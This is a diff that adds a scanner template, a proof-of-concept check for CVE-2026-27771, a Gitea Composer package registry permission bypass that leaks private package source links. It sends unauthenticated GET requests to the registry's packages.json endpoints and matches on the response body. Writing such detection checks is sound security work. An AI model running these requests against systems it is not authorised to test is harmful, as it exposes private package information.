@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "检测 Gitea Composer 包注册表权限绕过漏洞：未授权用户可通过访问 /api/packages/{owner}/composer/ 端点获取本应受限的私有或内部包源链接信息，导致敏感信息泄露。影响 Gitea <= 1.26.1，CVE-2026-27771。"
+id = "POC-AVE-2026-0300"
+name = "CVE-2026-27771 PoC"
+severity = "high"
+tags = ["cve-2026-27771"]
+vuln_id = [
+    "CVE-2026-27771",
+    "AVE-2026-0300",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/packages/composer/packages.json"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "packages",
+    "metadata-url",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/packages/{{owner}}/composer/packages.json"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["packages"]
